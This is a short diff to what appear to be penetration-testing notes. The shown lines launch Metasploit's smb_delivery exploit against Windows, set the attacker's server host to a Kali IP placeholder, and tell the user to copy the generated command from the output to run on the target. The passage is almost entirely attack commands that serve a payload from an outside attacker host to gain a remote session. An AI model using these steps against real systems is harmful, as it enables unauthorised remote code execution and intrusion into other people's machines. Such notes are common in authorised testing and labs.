@@ -6,6 +6,7 @@
 msfconsole -q
 use exploit/windows/smb/smb_delivery
 set target 0
+set SRVHOST <kali-IP>
 exploit
 
 # window (copy cmd from msfconsole output)
